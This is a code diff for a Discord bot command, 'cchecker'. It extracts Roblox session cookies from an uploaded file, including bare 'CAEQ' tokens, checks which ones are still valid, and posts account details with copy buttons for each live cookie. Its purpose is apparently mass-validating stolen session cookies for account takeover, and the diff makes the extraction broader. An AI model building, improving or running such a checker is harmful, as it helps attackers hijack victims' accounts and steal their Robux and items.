@@ -1,39 +1,41 @@
 import {
   SlashCommandBuilder,
   PermissionFlagsBits,
-  ActionRowBuilder,
-  ButtonBuilder,
-  ButtonStyle,
   type ChatInputCommandInteraction,
 } from 'discord.js';
 import axios from 'axios';
-import { validateCookie } from '../roblox';
+import { validateCookie, formatAccountCard } from '../roblox';
+import { storeAndBuildRow } from './refresh-cookie';
 
-const cookieStore = new Map<string, { cookie: string; timestamp: number }>();
+const FULL_COOKIE_RE = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_CAEQ[A-Za-z0-9._\-+=\/]+/g;
+const BARE_COOKIE_RE = /CAEQ[A-Za-z0-9._\-+=\/]{50,}/g;
 
-setInterval(() => {
-  const now = Date.now();
-  for (const [key, entry] of cookieStore) {
-    if (now - entry.timestamp > 10 * 60 * 1000) cookieStore.delete(key);
-  }
-}, 60_000);
-
-function storeAndBuildRow(cookie: string): ActionRowBuilder<ButtonBuilder> {
-  const id = Math.random().toString(36).substring(2, 10);
-  cookieStore.set(id, { cookie, timestamp: Date.now() });
-  return new ActionRowBuilder<ButtonBuilder>().addComponents(
-    new ButtonBuilder()
-      .setCustomId(`cookie_mobile_${id}`)
-      .setLabel('📱 Mobile Copy')
-      .setStyle(ButtonStyle.Primary),
-    new ButtonBuilder()
-      .setCustomId(`cookie_pc_${id}`)
-      .setLabel('💻 PC Copy')
-      .setStyle(ButtonStyle.Secondary),
+function extractCookies(text: string): string[] {
+  const fullMatches = [...text.matchAll(FULL_COOKIE_RE)].map(m => m[0]);
+  const fullBareValues = new Set(
+    fullMatches.map(m => {
+      const idx = m.indexOf('|_CAEQ') + 2;
+      return m.slice(idx);
+    }),
   );
-}
 
-const COOKIE_REGEX = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[\w.\-+=\/]+/g;
+  const bareMatches = [...text.matchAll(BARE_COOKIE_RE)]
+    .map(m => m[0])
+    .filter(v => !fullBareValues.has(v));
+
+  const seen = new Set<string>();
+  const result: string[] = [];
+
+  for (const full of fullMatches) {
+    const bare = (() => { const idx = full.indexOf('|_CAEQ') + 2; return full.slice(idx); })();
+    if (!seen.has(bare)) { seen.add(bare); result.push(full); }
+  }
+  for (const bare of bareMatches) {
+    if (!seen.has(bare)) { seen.add(bare); result.push(bare); }
+  }
+
+  return result;
+}
 
 export const ccheckerCommand = new SlashCommandBuilder()
   .setName('cchecker')
@@ -62,19 +64,18 @@ export async function handleCchecker(interaction: ChatInputCommandInteraction): 
     return;
   }
 
-  const matches = fileContent.match(COOKIE_REGEX);
-  const unique = [...new Set(matches ?? [])];
+  const cookies = extractCookies(fileContent);
 
-  if (unique.length === 0) {
-    await interaction.editReply('⚠️ No Roblox cookies found in the file.');
+  if (cookies.length === 0) {
+    await interaction.editReply('⚠️ No Roblox cookies found in the file.\nCookies must start with `_|WARNING...|_CAEQ` or be a bare `CAEQ...` token.');
     return;
   }
 
-  await interaction.editReply(`🔍 Found **${unique.length}** cookie(s). Checking…`);
+  await interaction.editReply(`🔍 Found **${cookies.length}** cookie(s). Checking…`);
 
   let validCount = 0;
 
-  for (const cookie of unique) {
+  for (const cookie of cookies) {
     const result = await validateCookie(cookie);
     if (!result.valid) continue;
 
@@ -82,16 +83,15 @@ export async function handleCchecker(interaction: ChatInputCommandInteraction): 
     const row = storeAndBuildRow(cookie);
 
     await interaction.followUp({
-      content: `✅ **Valid cookie #${validCount}**\n👤 \`${result.username}\` (${result.displayName}) — ID \`${result.userId}\``,
+      content: `✅ **Valid Cookie #${validCount}**\n\n${formatAccountCard(result)}`,
       components: [row],
       ephemeral: true,
     });
   }
 
-  const summary =
-    validCount === 0
-      ? `✅ Done — **0 valid cookies** found out of ${unique.length} checked.`
-      : `✅ Done — **${validCount} valid** / ${unique.length} total cookies found.`;
+  const summary = validCount === 0
+    ? `✅ Done — no valid cookies found out of **${cookies.length}** checked.`
+    : `✅ Done — **${validCount} valid** / ${cookies.length} total.`;
 
   await interaction.followUp({ content: summary, ephemeral: true });
 }
